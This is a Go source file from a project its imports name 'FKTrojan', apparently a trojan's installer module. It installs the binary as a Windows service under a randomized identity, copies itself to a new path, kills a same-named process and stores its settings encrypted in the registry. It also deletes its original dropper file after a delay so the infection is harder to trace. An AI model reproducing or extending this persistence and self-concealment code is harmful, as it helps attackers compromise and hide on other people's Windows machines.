package hide_client

import (
	"FKTrojan/common"
	"FKTrojan/registry_crypto"
	"fmt"
	"os"
	"path/filepath"

	"FKTrojan/config_client"
	"encoding/json"
	"os/exec"

	"time"

	"FKTrojan/flog"

	"golang.org/x/sys/windows/svc"
)

func Install() error {
	config_client.Load()
	return install()
}
func Uninstall() error {
	return uninstall()
}
func Start() error {
	return start()
}
func Stop() error {
	return stop()
}
func Service() error {
	s, err := readRegistry()
	if err != nil {
		return err
	}
	jsonStr, err := json.MarshalIndent(*s, "", " ")
	fmt.Println(string(jsonStr))
	return nil
}
func GetConfig() error {
	s, err := registry_crypto.Get(registry_crypto.CONFIGKEY)
	if err != nil {
		return err
	}
	fmt.Println(s)
	return nil
}
func killProcess(si *ServiceInfo) error {
	exe := filepath.Base(si.Path)
	cmd := exec.Command("taskkill", "/IM", exe, "/f")
	cmd.Run()
	return nil
}
func copyBinary(si *ServiceInfo) error {
	exe := os.Args[0]
	dir := filepath.Dir(si.Path)
	err := os.MkdirAll(dir, 0666)
	if err != nil {
		return err
	}
	return common.CopyFile(exe, si.Path)
}

func writeRegistry(si *ServiceInfo) error {
	siStr, err := si.String()
	if err != nil {
		return err
	}
	return registry_crypto.Set(registry_crypto.SERVERKEY, siStr)
}

func readRegistry() (*ServiceInfo, error) {
	k, err := registry_crypto.Get(registry_crypto.SERVERKEY)
	if err != nil {
		return nil, err
	}

	return ParseSI(k)
}
func delRegistry() error {
	err := registry_crypto.Del(registry_crypto.SERVERKEY)
	if err != nil {
		return err
	}
	err = registry_crypto.Del(registry_crypto.CONFIGKEY)
	if err != nil {
		return err
	}
	err = registry_crypto.Del(registry_crypto.UIDKEY)
	if err != nil {
		return err
	}
	return nil
}
func install() error {
	r, err := readRegistry()
	if err == nil && r != nil {
		return fmt.Errorf("already have one %v", r)
	}
	si := randomSI()
	killProcess(si)
	err = copyBinary(si)
	if err != nil {
		return err
	}
	err = writeRegistry(si)
	if err != nil {
		return err
	}
	return si.installService()
}
func uninstall() error {
	r, err := readRegistry()
	if err != nil {
		return fmt.Errorf("read error %v", err)
	}
	err = delRegistry()
	if err != nil {
		return err
	}
	err = r.removeService()
	if err != nil {
		fmt.Printf("remove service error %v\n", err)
	}
	/*if err != nil {
		return err
	}*/
	err = common.KillPathExe(r.Path)
	if err != nil {
		fmt.Printf("kill exe error %v\n", err)
	}
	/*
		if err != nil {
			return err
		}
	*/
	err = os.Remove(r.Path)
	if err != nil {
		fmt.Printf("remove file error %v\n", err)
	}
	if err != nil {
		return err
	}
	return nil
}
func start() error {
	r, err := readRegistry()
	if err != nil {
		return fmt.Errorf("read error %v", err)
	}
	return r.startService()
}
func stop() error {
	r, err := readRegistry()
	if err != nil {
		return fmt.Errorf("read error %v", err)
	}
	return r.stopService()
}
func StartingOrStopping() (bool, error) {
	r, err := readRegistry()
	if err != nil {
		return false, fmt.Errorf("read error %v", err)
	}
	status, err := r.status()
	if err != nil {
		return false, err
	}
	return status == svc.StartPending || status == svc.StopPending, nil
}
func WriteExePath() error {
	currentPath, _ := exec.LookPath(os.Args[0])
	return registry_crypto.Set(registry_crypto.FROMEXEPATH, currentPath)
}

func DeleteExePath() error {

	go func() {
		time.Sleep(5 * time.Second)
		path, err := registry_crypto.Get(registry_crypto.FROMEXEPATH)
		if err != nil {
			Flog.Flog.Printf("get path error %v", err)
			return
		}
		err = os.Remove(path)
		if err != nil {
			Flog.Flog.Printf("remove file %s error %v", path, err)
		}
		registry_crypto.Del(registry_crypto.FROMEXEPATH)
	}()
	return nil
}
